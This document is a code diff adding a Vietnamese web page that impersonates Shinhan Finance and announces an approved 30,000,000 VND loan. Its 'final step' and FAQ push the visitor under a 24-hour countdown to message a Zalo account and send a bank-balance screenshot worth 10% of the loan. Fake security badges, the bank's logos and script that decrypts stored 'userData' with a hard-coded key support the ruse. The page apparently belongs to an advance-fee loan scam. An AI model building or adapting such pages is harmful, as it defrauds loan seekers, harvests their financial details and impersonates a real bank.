@@ -1,0 +1,1313 @@
+<!DOCTYPE html>
+<html lang="vi">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <title>Phê Duyệt Khoản Vay - Shinhan Finance</title>
+
+    <!-- Security-Related Meta (headers khuyến nghị cấu hình ở server) -->
+    <meta http-equiv="X-Content-Type-Options" content="nosniff" />
+    <meta http-equiv="X-Frame-Options" content="DENY" />
+    <meta http-equiv="X-XSS-Protection" content="1; mode=block" />
+    <meta http-equiv="Referrer-Policy" content="strict-origin-when-cross-origin" />
+    <meta http-equiv="Permissions-Policy" content="camera=(), microphone=(), geolocation=()" />
+
+    <!-- SEO -->
+    <link rel="canonical" href="/shinhanbank/pages/vi/step8.html" />
+    <meta name="description" content="Khoản vay của bạn đã được phê duyệt. Hoàn tất thẩm định điều kiện giải ngân và nhận tiền an toàn." />
+    <meta name="keywords" content="Shinhan Finance, Shinhan Bank, vay tiêu dùng, phê duyệt, giải ngân" />
+    <meta name="author" content="Shinhan Finance Vietnam" />
+    <meta name="robots" content="index, follow" />
+    <meta name="theme-color" content="#00468F" />
+
+    <!-- Open Graph / Social -->
+    <meta property="og:title" content="Bước 8: Phê Duyệt Khoản Vay - Shinhan Finance" />
+    <meta property="og:description" content="Hoàn tất thẩm định điều kiện giải ngân để nhận tiền nhanh chóng." />
+    <meta property="og:type" content="website" />
+    <meta property="og:url" content="/shinhanbank/pages/vi/step8.html" />
+    <meta property="og:image" content="https://shinhan.com.vn/public/themes/shinhan/img/shinhan_logo_2.svg" />
+    <meta name="twitter:card" content="summary" />
+    <meta name="twitter:title" content="Bước 8: Phê Duyệt Khoản Vay - Shinhan Finance" />
+    <meta name="twitter:description" content="Hoàn tất thẩm định điều kiện giải ngân để nhận tiền nhanh chóng." />
+
+    <!-- Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet" />
+
+    <!-- Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
+
+    <!-- Favicon -->
+    <link rel="icon" href="https://shinhan.com.vn/favicon.ico" />
+
+    <!-- App Styles -->
+    <style>
+      :root {
+        --brand: #00468f;
+        --brand-dark: #003a78;
+        --accent: #2bb673; /* Changed to green color */
+        --warning: #ffb703;
+        --danger: #e63946;
+        --text: #1f2937;
+        --muted: #6b7280;
+        --bg: #f7fafc;
+        --white: #ffffff;
+        --card: #ffffff;
+        --border: #e5e7eb;
+        --shadow: 0 10px 20px rgba(0,0,0,0.08);
+      }
+
+      /* Dark mode support */
+      @media (prefers-color-scheme: dark) {
+        :root {
+          --text: #f3f4f6;
+          --muted: #9ca3af;
+          --bg: #111827;
+          --card: #1f2937;
+          --border: #374151;
+          --shadow: 0 10px 20px rgba(0,0,0,0.3);
+        }
+        
+        .notice-card {
+          background: #1e3a8a;
+          border-color: #3b82f6;
+        }
+        
+        .faq-question {
+          background: #374151;
+          color: var(--text);
+        }
+        
+        .faq-question:hover {
+          background: #4b5563;
+        }
+        
+        .btn-secondary {
+          background: #374151;
+          color: var(--text);
+          border-color: var(--border);
+        }
+      }
+
+      * { box-sizing: border-box; }
+      html, body {
+        margin: 0;
+        padding: 0;
+        font-family: Inter, system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial, "Apple Color Emoji","Segoe UI Emoji";
+        color: var(--text);
+        background: var(--bg);
+      }
+
+      a { color: var(--brand); text-decoration: none; }
+      a:hover { text-decoration: underline; }
+
+      .skip-link {
+        position: absolute;
+        left: -999px;
+        top: -999px;
+        background: var(--brand);
+        color: var(--white);
+        padding: 8px 12px;
+        border-radius: 6px;
+        z-index: 1000;
+      }
+      .skip-link:focus {
+        left: 16px;
+        top: 16px;
+      }
+
+      .app-container {
+        min-height: 100vh;
+        display: flex;
+        flex-direction: column;
+      }
+
+      .header-section {
+        position: relative;
+        padding: 48px 16px 24px;
+        background: linear-gradient(135deg, #0a2540 0%, var(--brand) 50%, #1b4f8a 100%);
+        color: var(--white);
+        overflow: hidden;
+      }
+      .header-background .header-pattern {
+        position: absolute;
+        inset: 0;
+        background-image:
+          radial-gradient(rgba(255,255,255,0.08) 1px, transparent 1px),
+          linear-gradient(rgba(255,255,255,0.05), rgba(255,255,255,0.05));
+        background-size: 24px 24px, cover;
+        pointer-events: none;
+      }
+      .header-logo {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        margin-bottom: 24px;
+      }
+      .logo-image {
+        width: 200px;
+        height: 60px;
+        object-fit: contain;
+        filter: drop-shadow(0 4px 8px rgba(0,0,0,0.25));
+        background: transparent;
+      }
+
+      .header-content {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        gap: 12px;
+      }
+      .success-icon-container {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+      }
+      .success-icon-main {
+        width: 84px;
+        height: 84px;
+        border-radius: 50%;
+        background: var(--accent); /* Changed to green color */
+        display: grid;
+        place-items: center;
+        box-shadow: var(--shadow);
+      }
+      .success-icon-main i {
+        font-size: 36px;
+        color: var(--white);
+      }
+      .success-dots {
+        display: grid;
+        grid-template-columns: repeat(6, 6px);
+        gap: 6px;
+        margin-left: 16px;
+      }
+      .success-dots .dot {
+        width: 6px;
+        height: 6px;
+        border-radius: 50%;
+        background: rgba(255,255,255,0.8);
+        opacity: 0.75;
+      }
+
+      .success-message h1 {
+        margin: 12px 0 4px;
+        font-size: 28px;
+        font-weight: 700;
+        text-align: center;
+      }
+      .success-amount {
+        font-size: 20px;
+        font-weight: 600;
+        color: #d1fae5;
+        text-shadow: 0 1px 0 rgba(0,0,0,0.1);
+      }
+
+      .main-content {
+        flex: 1;
+        padding: 24px 16px 48px;
+        max-width: 960px;
+        margin: 0 auto;
+      }
+
+      .timeline-compact {
+        background: var(--card);
+        border: 1px solid var(--border);
+        border-radius: 16px;
+        box-shadow: var(--shadow);
+        padding: 16px;
+        margin-top: -24px;
+      }
+      .timeline-header {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        color: var(--text);
+        margin-bottom: 8px;
+      }
+      .timeline-label {
+        font-weight: 600;
+        color: var(--muted);
+      }
+      .countdown-timer {
+        font-feature-settings: "tnum";
+        font-variant-numeric: tabular-nums;
+        font-weight: 700;
+        color: var(--brand);
+        display: flex;
+        align-items: center;
+        gap: 8px;
+      }
+
+      .loading-spinner {
+        width: 16px;
+        height: 16px;
+        border: 2px solid var(--border);
+        border-top: 2px solid var(--brand);
+        border-radius: 50%;
+        animation: spin 1s linear infinite;
+      }
+
+      @keyframes spin {
+        0% { transform: rotate(0deg); }
+        100% { transform: rotate(360deg); }
+      }
+      .progress-track {
+        width: 100%;
+        height: 10px;
+        background: #edf2f7;
+        border-radius: 999px;
+        overflow: hidden;
+      }
+      .progress-fill-bar {
+        height: 100%;
+        width: 0%;
+        background: linear-gradient(90deg, var(--brand) 0%, #3b82f6 100%);
+        transition: width 300ms ease;
+      }
+
+      .section-header {
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        margin: 24px 0 12px;
+      }
+      .section-header h2 {
+        font-size: 22px;
+        margin: 0;
+      }
+      .section-icon i {
+        color: var(--brand);
+      }
+
+      .info-section .info-grid {
+        display: grid;
+        grid-template-columns: 1fr;
+        gap: 12px;
+      }
+      .info-card-unified {
+        background: var(--card);
+        border: 1px solid var(--border);
+        border-radius: 16px;
+        box-shadow: var(--shadow);
+      }
+      .info-content {
+        padding: 16px;
+      }
+      .info-row {
+        display: grid;
+        grid-template-columns: 1fr 1fr;
+        padding: 10px 0;
+        border-bottom: 1px dashed var(--border);
+      }
+      .info-row:last-child { border-bottom: none; }
+      .info-label { color: var(--muted); }
+      .info-value { font-weight: 600; }
+
+      .notice-card {
+        display: flex;
+        gap: 12px;
+        background: #eef6ff;
+        border: 1px solid #dbeafe;
+        border-radius: 16px;
+        box-shadow: var(--shadow);
+        padding: 16px;
+      }
+      .notice-card .notice-icon i { color: #0ea5e9; }
+      .notice-card h3 { margin: 0 0 6px; }
+
+      .faq-section .faq-container {
+        display: grid;
+        gap: 12px;
+        margin-top: 12px;
+      }
+      .faq-item {
+        background: var(--card);
+        border: 1px solid var(--border);
+        border-radius: 12px;
+        overflow: hidden;
+      }
+      .faq-question {
+        width: 100%;
+        text-align: left;
+        background: #f9fafb;
+        border: none;
+        padding: 14px 16px;
+        font-weight: 600;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        cursor: pointer;
+      }
+      .faq-question i { transition: transform 200ms ease; }
+      .faq-question[aria-expanded="true"] i { transform: rotate(180deg); }
+      .faq-answer {
+        display: none;
+        padding: 12px 16px 16px;
+        animation: fadeIn 200ms ease;
+      }
+      .faq-answer.open { display: block; }
+
+      @keyframes fadeIn {
+        from { opacity: 0; transform: translateY(-8px); }
+        to { opacity: 1; transform: translateY(0); }
+      }
+
+      .btn {
+        display: inline-flex;
+        gap: 8px;
+        align-items: center;
+        justify-content: center;
+        padding: 10px 16px;
+        border-radius: 10px;
+        border: 1px solid transparent;
+        font-weight: 600;
+        cursor: pointer;
+        transition: transform 120ms ease, box-shadow 120ms ease;
+      }
+      .btn:hover { transform: translateY(-1px); box-shadow: var(--shadow); }
+      .btn:active { transform: translateY(0); }
+      .btn-primary { background: var(--brand); color: var(--white); }
+      .btn-primary:hover { background: var(--brand-dark); }
+      .btn-secondary { background: #f3f4f6; color: var(--text); border-color: var(--border); }
+      .btn-large { padding: 12px 18px; font-size: 16px; }
+
+      .zalo-contact-section {
+        margin-top: 16px;
+        display: flex;
+        justify-content: center;
+        flex-wrap: wrap;
+        gap: 12px;
+      }
+
+      .support-options {
+        display: grid;
+        grid-template-columns: 1fr 1fr;
+        gap: 12px;
+      }
+
+      .support-option {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        gap: 8px;
+        padding: 16px;
+        background: var(--card);
+        border: 1px solid var(--border);
+        border-radius: 12px;
+        text-decoration: none;
+        color: var(--text);
+        transition: all 200ms ease;
+      }
+
+      .support-option:hover {
+        background: var(--bg);
+        transform: translateY(-2px);
+        box-shadow: var(--shadow);
+      }
+
+      .support-option i {
+        font-size: 24px;
+        color: var(--brand);
+      }
+
+      .footer-section {
+        background: #0a2540;
+        color: var(--white);
+        margin-top: 24px;
+      }
+      .footer-content {
+        max-width: 960px;
+        margin: 0 auto;
+        padding: 16px;
+        display: grid;
+        grid-template-columns: 1fr;
+        gap: 12px;
+      }
+      .contact-info {
+        display: flex;
+        gap: 16px;
+        flex-wrap: wrap;
+      }
+      .contact-item {
+        display: inline-flex;
+        gap: 8px;
+        align-items: center;
+      }
+      .contact-item a {
+        color: #dbeafe;
+      }
+      .security-badges {
+        display: flex;
+        gap: 16px;
+        flex-wrap: wrap;
+      }
+      .security-badge {
+        display: inline-flex;
+        gap: 8px;
+        align-items: center;
+        color: #dbeafe;
+      }
+
+      .modal[aria-hidden="true"] { display: none; }
+      .modal[aria-hidden="false"] {
+        position: fixed;
+        inset: 0;
+        display: grid;
+        place-items: center;
+        z-index: 1000;
+      }
+      .modal-overlay {
+        position: absolute;
+        inset: 0;
+        background: rgba(0,0,0,0.35);
+      }
+      .modal-content {
+        position: relative;
+        background: var(--card);
+        border-radius: 16px;
+        box-shadow: var(--shadow);
+        width: 92%;
+        max-width: 520px;
+        overflow: hidden;
+      }
+      .modal-header, .modal-body, .modal-footer { padding: 16px; }
+      .modal-header {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        border-bottom: 1px solid var(--border);
+      }
+      .modal-close {
+        border: none;
+        background: transparent;
+        font-size: 20px;
+        cursor: pointer;
+        color: var(--muted);
+      }
+      .modal-info .info-row {
+        grid-template-columns: 1fr 1fr;
+      }
+
+      .zalo-guidance {
+        position: fixed;
+        bottom: 24px;
+        right: 24px;
+        z-index: 900;
+      }
+      .zalo-guidance .guidance-content {
+        background: var(--card);
+        border: 1px solid var(--border);
+        border-radius: 12px;
+        box-shadow: var(--shadow);
+        padding: 12px 14px;
+      }
+      .zalo-guidance .close-btn {
+        position: absolute;
+        top: 6px;
+        right: 8px;
+        border: none;
+        background: transparent;
+        font-size: 18px;
+        cursor: pointer;
+      }
+
+      /* Zalo widget position - fixed to right side */
+      .zalo-chat-widget {
+        position: fixed;
+        bottom: 20px;
+        right: 20px;
+        z-index: 999;
+      }
+
+      @media (min-width: 640px) {
+        .info-section .info-grid { grid-template-columns: 1fr 1fr; }
+        .main-content { padding: 32px 24px 64px; }
+        .timeline-compact { padding: 20px; }
+        .info-content { padding: 20px; }
+      }
+
+      @media (min-width: 1024px) {
+        .info-section .info-grid { grid-template-columns: repeat(3, 1fr); }
+        .main-content { padding: 40px 32px 80px; }
+        .header-section { padding: 64px 24px 32px; }
+        .success-message h1 { font-size: clamp(28px, 4vw, 32px); }
+        .success-amount { font-size: clamp(20px, 3vw, 24px); }
+      }
+
+      /* Performance optimizations */
+      .logo-image, .success-icon-main {
+        will-change: transform;
+      }
+      
+      .btn, .faq-question, .support-option {
+        will-change: transform, box-shadow;
+      }
+    </style>
+
+    <noscript>
+      <style>
+        .faq-answer { display: block !important; }
+        .modal { display: none !important; }
+      </style>
+      Trình duyệt của bạn đang tắt JavaScript. Một số chức năng (đếm ngược, mở Zalo, modal, FAQ) sẽ không hoạt động.
+    </noscript>
+  </head>
+  <body>
+    <!-- Skip to content link for accessibility -->
+    <a href="#main-content" class="skip-link">Bỏ qua điều hướng, tới nội dung chính</a>
+
+    <div class="app-container">
+      <!-- Header Section -->
+      <header class="header-section">
+        <div class="header-background">
+          <div class="header-pattern"></div>
+        </div>
+
+        <!-- Logo Shinhan Finance -->
+        <div class="header-logo">
+          <img
+            src="https://cdn.haitrieu.com/wp-content/uploads/2023/11/Logo-Shinhan-Bank.png"
+            alt="Shinhan Finance Vietnam"
+            class="logo-image"
+            width="200"
+            height="60"
+            decoding="async"
+            loading="lazy"
+            onerror="this.src='https://shinhan.com.vn/public/themes/shinhan/img/shinhan_logo_2.svg'"
+          />
+        </div>
+
+        <div class="header-content">
+          <!-- Success Icon -->
+          <div class="success-icon-container">
+            <div class="success-icon-main">
+              <i class="fas fa-check" aria-hidden="true"></i>
+            </div>
+            <div class="success-dots" aria-hidden="true">
+              <div class="dot"></div><div class="dot"></div><div class="dot"></div>
+              <div class="dot"></div><div class="dot"></div><div class="dot"></div>
+            </div>
+          </div>
+
+          <!-- Success Message -->
+          <div class="success-message">
+            <h1>Giao dịch thành công</h1>
+            <div class="success-amount" id="loanAmountValue">30.000.000 VND</div>
+          </div>
+        </div>
+      </header>
+
+      <!-- Main Content -->
+      <main id="main-content" class="main-content" role="main" tabindex="-1">
+        <!-- Timeline Progress Bar -->
+        <div class="timeline-compact" aria-labelledby="timelineLabel">
+          <div class="timeline-header">
+            <span id="timelineLabel" class="timeline-label">Thời gian còn lại</span>
+            <span class="countdown-timer" id="countdownTimer" aria-live="polite" aria-label="Thời gian còn lại để hoàn tất thủ tục">23:59:59</span>
+          </div>
+          <div class="progress-track" aria-hidden="true">
+            <div class="progress-fill-bar" id="timelineProgress" style="width: 25%"></div>
+          </div>
+        </div>
+
+        <!-- Customer Information -->
+        <section class="info-section" aria-labelledby="customerInfoTitle">
+          <div class="section-header">
+            <h2 id="customerInfoTitle">Thông tin khách hàng</h2>
+            <div class="section-icon"><i class="fas fa-user-shield" aria-hidden="true"></i></div>
+          </div>
+          <div class="info-grid">
+            <div class="info-card-unified">
+              <div class="info-content">
+                <div class="info-row">
+                  <div class="info-label">Họ và tên</div>
+                  <div class="info-value" id="customerName">Nguyễn Văn A</div>
+                </div>
+                <div class="info-row">
+                  <div class="info-label">Số tiền góp hàng tháng</div>
+                  <div class="info-value" id="monthlyPaymentAmount">2.500.000 đ</div>
+                </div>
+                <div class="info-row">
+                  <div class="info-label">Ngày góp hàng tháng</div>
+                  <div class="info-value" id="paymentDate">15/01/2025</div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </section>
+
+        <!-- Disbursement Process -->
+        <section class="process-section" aria-labelledby="processTitle">
+          <div class="section-header">
+            <h2 id="processTitle">Bước cuối cùng: Thẩm định điều kiện giải ngân</h2>
+            <div class="section-icon"><i class="fas fa-clipboard-check" aria-hidden="true"></i></div>
+          </div>
+
+          <!-- Important Notice -->
+          <div class="notice-card notice-info" role="alert" aria-live="polite">
+            <div class="notice-icon"><i class="fas fa-exclamation-circle" aria-hidden="true"></i></div>
+            <div class="notice-content">
+              <h3>Thông báo quan trọng</h3>
+              <p>
+                Để hoàn tất thủ tục giải ngân, vui lòng liên hệ bộ phận thẩm định và cung cấp ảnh chụp màn hình số dư
+                <strong id="requiredAmount">3.000.000 đ</strong> (10% số tiền vay) trong tài khoản ngân hàng đăng ký trong hồ sơ vay.
+              </p>
+            </div>
+          </div>
+        </section>
+
+        <!-- FAQ Section -->
+        <section class="faq-section" aria-labelledby="faqTitle">
+          <div class="section-header">
+            <h2 id="faqTitle">Câu hỏi thường gặp</h2>
+            <div class="section-icon"><i class="fas fa-question-circle" aria-hidden="true"></i></div>
+          </div>
+
+          <div class="faq-container">
+            <div class="faq-item">
+              <button class="faq-question" aria-expanded="false">
+                <span>Điều kiện giải ngân là gì?</span>
+                <i class="fas fa-chevron-down" aria-hidden="true"></i>
+              </button>
+              <div class="faq-answer">
+                <p><strong>Điều kiện giải ngân bao gồm:</strong></p>
+                <ul>
+                  <li><strong>Số dư khả dụng:</strong> Tài khoản của bạn phải có số dư khả dụng hiện tại.</li>
+                  <li><strong>Ảnh chứng minh:</strong> Chụp ảnh màn hình số dư tài khoản hiện tại.</li>
+                  <li><strong>Thời gian ảnh:</strong> Ảnh phải chụp trong vòng 24 giờ gần nhất.</li>
+                  <li><strong>Tài khoản chính:</strong> Chỉ chấp nhận ảnh từ tài khoản chính của bạn.</li>
+                </ul>
+                <p><strong>Quy trình:</strong> Liên hệ qua Zalo bộ phận thẩm định → Gửi ảnh số dư → Chờ xác minh → Nhận tiền giải ngân.</p>
+              </div>
+            </div>
+
+            <div class="faq-item">
+              <button class="faq-question" aria-expanded="false">
+                <span>Sau khi đủ và gửi ảnh số dư thì bao lâu giải ngân?</span>
+                <i class="fas fa-chevron-down" aria-hidden="true"></i>
+              </button>
+              <div class="faq-answer">
+                <p><strong>Thời gian giải ngân:</strong></p>
+                <ul>
+                  <li><strong>Trong giờ làm việc:</strong> 1-2 giờ sau khi xác minh thành công.</li>
+                  <li><strong>Ngoài giờ làm việc:</strong> Ngày làm việc tiếp theo.</li>
+                  <li><strong>Cuối tuần:</strong> Thứ 2 tuần sau.</li>
+                  <li><strong>Ngày lễ:</strong> Ngày làm việc đầu tiên sau lễ.</li>
+                </ul>
+              </div>
+            </div>
+
+            <div class="faq-item">
+              <button class="faq-question" aria-expanded="false">
+                <span>Số dư này có chuyển hay đóng phí gì không?</span>
+                <i class="fas fa-chevron-down" aria-hidden="true"></i>
+              </button>
+              <div class="faq-answer">
+                <p><strong>Miễn phí:</strong> Không thu phí thẩm định hay giải ngân. Không cần chuyển khoản.</p>
+                <p><strong>Cảnh báo:</strong> Nếu có ai yêu cầu chuyển tiền hoặc đóng phí trước, đó là lừa đảo.</p>
+              </div>
+            </div>
+
+            <div class="faq-item">
+              <button class="faq-question" aria-expanded="false">
+                <span>Ảnh số dư cũ được không?</span>
+                <i class="fas fa-chevron-down" aria-hidden="true"></i>
+              </button>
+              <div class="faq-answer">
+                <p><strong>Không chấp nhận ảnh cũ:</strong> Chỉ ảnh hiện tại trong vòng 24 giờ.</p>
+              </div>
+            </div>
+
+            <div class="faq-item">
+              <button class="faq-question" aria-expanded="false">
+                <span>Sau khi giải ngân có cần giữ số dư?</span>
+                <i class="fas fa-chevron-down" aria-hidden="true"></i>
+              </button>
+              <div class="faq-answer">
+                <p><strong>Không cần:</strong> Sau giải ngân, có thể sử dụng số dư bình thường; quan trọng là trả nợ đúng hạn.</p>
+              </div>
+            </div>
+
+            <div class="faq-item">
+              <button class="faq-question" aria-expanded="false">
+                <span>Hướng dẫn chứng minh điều kiện giải ngân</span>
+                <i class="fas fa-chevron-down" aria-hidden="true"></i>
+              </button>
+              <div class="faq-answer">
+                <p><strong>Hướng dẫn:</strong> Liên hệ Zalo, chụp ảnh số dư rõ nét, gửi cho chuyên viên để xác minh.</p>
+              </div>
+            </div>
+
+            <div class="faq-item">
+              <button class="faq-question" aria-expanded="false">
+                <span>Nếu quá 24 giờ chưa liên hệ thì sao?</span>
+                <i class="fas fa-chevron-down" aria-hidden="true"></i>
+              </button>
+              <div class="faq-answer">
+                <p><strong>Khuyến nghị:</strong> Liên hệ ngay hotline, email hoặc chi nhánh để hỗ trợ xử lý.</p>
+              </div>
+            </div>
+          </div>
+
+          <!-- Contact Buttons -->
+          <div class="zalo-contact-section">
+            <a
+              href="https://zalo.me/3932037504673339016"
+              target="_blank"
+              rel="noopener noreferrer"
+              class="btn btn-primary btn-large btn-zalo-main"
+              id="openZaloDirectBtn"
+              aria-label="Mở Zalo để liên hệ bộ phận thẩm định"
+            >
+              <i class="fab fa-telegram-plane" aria-hidden="true"></i>
+              <span>Mở Zalo ngay</span>
+              <i class="fas fa-arrow-right" aria-hidden="true"></i>
+            </a>
+            <button
+              class="btn btn-secondary btn-large"
+              id="supportFallbackBtn"
+              aria-label="Liên hệ hỗ trợ qua điện thoại hoặc email"
+              style="margin-left: 12px;"
+            >
+              <i class="fas fa-headset" aria-hidden="true"></i>
+              <span>Liên hệ hỗ trợ</span>
+            </button>
+          </div>
+        </section>
+      </main>
+
+      <!-- Footer -->
+      <footer class="footer-section">
+        <div class="footer-content">
+          <div class="contact-info">
+            <div class="contact-item">
+              <i class="fas fa-phone-alt" aria-hidden="true"></i>
+              <a href="tel:+8419005555888" aria-label="Gọi hotline 1900 5555 888">Hotline: 1900 5555 888</a>
+            </div>
+            <div class="contact-item">
+              <i class="fas fa-envelope-open-text" aria-hidden="true"></i>
+              <a href="mailto:support@shinhan.com.vn?subject=Hỗ trợ giải ngân khoản vay" aria-label="Gửi email tới support@shinhan.com.vn" rel="noopener noreferrer">Email: support@shinhan.com.vn</a>
+            </div>
+          </div>
+
+          <div class="security-badges" aria-label="Chứng chỉ bảo mật">
+            <div class="security-badge">
+              <i class="fas fa-shield-check" aria-hidden="true"></i>
+              <span>SSL 256-bit</span>
+            </div>
+            <div class="security-badge">
+              <i class="fas fa-user-lock" aria-hidden="true"></i>
+              <span>Bảo mật cao</span>
+            </div>
+            <div class="security-badge">
+              <i class="fas fa-award" aria-hidden="true"></i>
+              <span>PCI DSS</span>
+            </div>
+          </div>
+        </div>
+      </footer>
+    </div>
+
+    <!-- Modal Confirmation -->
+    <div class="modal" id="confirmationModal" aria-hidden="true" aria-modal="true" role="dialog" aria-labelledby="confirmTitle">
+      <div class="modal-overlay"></div>
+      <div class="modal-content">
+        <div class="modal-header">
+          <h3 id="confirmTitle">Xác nhận giải ngân</h3>
+          <button class="modal-close" aria-label="Đóng cửa sổ xác nhận">×</button>
+        </div>
+        <div class="modal-body">
+          <p>
+            Bạn có chắc chắn muốn hoàn tất thủ tục và giải ngân khoản vay
+            <strong id="modalLoanAmount">30.000.000 đ</strong>?
+          </p>
+          <div class="modal-info">
+            <div class="info-row">
+              <span class="info-label">Số tiền vay:</span>
+              <span class="info-value" id="modalLoanAmount2">30.000.000 đ</span>
+            </div>
+            <div class="info-row">
+              <span class="info-label">Tài khoản nhận:</span>
+              <span class="info-value">****1234</span>
+            </div>
+            <div class="info-row">
+              <span class="info-label">Thời gian nhận tiền:</span>
+              <span class="info-value">1-2 giờ làm việc</span>
+            </div>
+          </div>
+        </div>
+        <div class="modal-footer">
+          <button class="btn btn-secondary" id="modalCancelBtn" aria-label="Hủy bỏ và đóng cửa sổ">Hủy</button>
+          <button class="btn btn-primary" id="modalConfirmBtn" aria-label="Xác nhận và mở ứng dụng Zalo">
+            <i class="fas fa-check-circle" aria-hidden="true"></i>
+            Xác nhận và mở Zalo
+          </button>
+        </div>
+      </div>
+    </div>
+
+    <!-- Zalo Guidance Popup -->
+    <div class="zalo-guidance" id="zaloGuidance" style="display: none">
+      <div class="guidance-content">
+        <h4>📱 Hướng dẫn liên hệ Zalo</h4>
+        <ol>
+          <li>Tìm kiếm "Shinhan Finance - Bộ phận Thẩm định"</li>
+          <li>Gửi tin nhắn: "Tôi cần thẩm định giải ngân"</li>
+          <li>Chụp ảnh số dư tài khoản hiện tại</li>
+          <li>Gửi ảnh cho chuyên viên</li>
+        </ol>
+        <button class="close-btn" onclick="closeZaloGuidance()">×</button>
+      </div>
+    </div>
+
+    <!-- Zalo Chat Widget - Positioned on the right side -->
+    <div class="zalo-chat-widget" data-oaid="3932037504673339016" data-welcome-message="Rất vui khi được hỗ trợ bạn!" data-autopopup="0" data-width="" data-height=""></div>
+
+    <!-- CryptoJS for localStorage decryption -->
+    <script src="https://cdn.jsdelivr.net/npm/crypto-js@4.1.1/crypto-js.min.js"></script>
+
+    <!-- App Scripts -->
+    <script>
+      (function () {
+        const qs = (sel, ctx = document) => ctx.querySelector(sel);
+        const qsa = (sel, ctx = document) => Array.from(ctx.querySelectorAll(sel));
+
+        // Focus management for Skip Link
+        function setupSkipLink() {
+          const main = qs('#main-content');
+          if (main) {
+            main.setAttribute('role', 'main');
+            main.setAttribute('tabindex', '-1');
+          }
+        }
+
+        // Countdown 24h and progress bar update with loading spinner
+        function setupCountdown() {
+          const timerEl = qs('#countdownTimer');
+          const progressEl = qs('#timelineProgress');
+          if (!timerEl || !progressEl) return;
+
+          // Show loading spinner initially
+          timerEl.innerHTML = '<div class="loading-spinner"></div>';
+
+          // Simulate loading delay
+          setTimeout(() => {
+            const TOTAL_MS = 24 * 60 * 60 * 1000;
+            const start = Date.now();
+            let remaining = TOTAL_MS;
+
+            function format(h, m, s) {
+              const pad = (n) => String(n).padStart(2, '0');
+              return `${pad(h)}:${pad(m)}:${pad(s)}`;
+            }
+
+            function tick() {
+              const elapsed = Date.now() - start;
+              remaining = Math.max(TOTAL_MS - elapsed, 0);
+              const hrs = Math.floor(remaining / (1000 * 60 * 60));
+              const mins = Math.floor((remaining % (1000 * 60 * 60)) / (1000 * 60));
+              const secs = Math.floor((remaining % (1000 * 60)) / 1000);
+              timerEl.textContent = format(hrs, mins, secs);
+              const progressPct = Math.min(100, Math.round((elapsed / TOTAL_MS) * 100));
+              progressEl.style.width = `${progressPct}%`;
+              if (remaining === 0) clearInterval(intv);
+            }
+
+            tick();
+            const intv = setInterval(tick, 1000);
+          }, 1000); // 1 second loading delay
+        }
+
+        // Accessible FAQ toggles
+        function setupFAQ() {
+          qsa('.faq-item').forEach((item, idx) => {
+            const btn = qs('.faq-question', item);
+            const answer = qs('.faq-answer', item);
+            if (!btn || !answer) return;
+            const answerId = `faq-answer-${idx}`;
+            answer.id = answerId;
+            btn.setAttribute('aria-controls', answerId);
+            btn.addEventListener('click', () => {
+              const expanded = btn.getAttribute('aria-expanded') === 'true';
+              btn.setAttribute('aria-expanded', String(!expanded));
+              answer.classList.toggle('open', !expanded);
+              if (!expanded) {
+                // Move focus into answer for screen readers
+                answer.setAttribute('tabindex', '-1');
+                answer.focus({ preventScroll: true });
+              }
+            });
+          });
+        }
+
+        // Modal controls
+        function setupModal() {
+          const modal = qs('#confirmationModal');
+          const openBtn = qs('#openZaloDirectBtn');
+          const closeBtn = qs('.modal-close', modal);
+          const cancelBtn = qs('#modalCancelBtn', modal);
+          const confirmBtn = qs('#modalConfirmBtn', modal);
+          const overlay = qs('.modal-overlay', modal);
+
+          if (!modal || !openBtn || !closeBtn || !cancelBtn || !confirmBtn || !overlay) return;
+
+          function openModal() {
+            modal.setAttribute('aria-hidden', 'false');
+            // Trap focus
+            confirmBtn.focus();
+            document.addEventListener('keydown', onKeyDown);
+          }
+          function closeModal() {
+            modal.setAttribute('aria-hidden', 'true');
+            document.removeEventListener('keydown', onKeyDown);
+            openBtn.focus();
+          }
+          function onKeyDown(e) {
+            if (e.key === 'Escape') closeModal();
+          }
+
+          openBtn.addEventListener('click', (e) => {
+            e.preventDefault();
+            openModal();
+          });
+          closeBtn.addEventListener('click', closeModal);
+          cancelBtn.addEventListener('click', closeModal);
+          overlay.addEventListener('click', closeModal);
+          confirmBtn.addEventListener('click', () => {
+            // Track the click event
+            trackZaloClick('modal_confirm');
+            
+            // Show redirect message
+            showRedirectMessage();
+            
+            // Auto-redirect to Zalo after 2 seconds
+            setTimeout(() => {
+              redirectToZalo();
+            }, 2000);
+            
+            closeModal();
+          });
+        }
+
+        // Save progress to localStorage with expiration
+        function saveProgressToLocalStorage() {
+          try {
+            const progressData = {
+              timestamp: Date.now(),
+              step: 8,
+              status: 'approved',
+              expiresAt: Date.now() + (7 * 24 * 60 * 60 * 1000) // 7 days
+            };
+            
+            localStorage.setItem('loanProgress', JSON.stringify(progressData));
+          } catch (error) {
+            console.error('Failed to save progress:', error);
+          }
+        }
+
+        // Check if data is expired (utility function)
+        function isDataExpired(progressData) {
+          return progressData?.expiresAt && Date.now() > progressData.expiresAt;
+        }
+
+        // Populate data from localStorage if present
+        function populateFromLocalStorage() {
+          try {
+            const raw = localStorage.getItem('userData');
+            if (!raw) {
+              // Show placeholder data if no localStorage data
+              showPlaceholderData();
+              return;
+            }
+            
+            // Try to decrypt if it's encrypted
+            let data;
+            try {
+              // Try to decrypt with CryptoJS
+              const bytes = CryptoJS.AES.decrypt(raw, 'shinhan-secret-key');
+              const decryptedData = bytes.toString(CryptoJS.enc.Utf8);
+              if (decryptedData) {
+                data = JSON.parse(decryptedData);
+              } else {
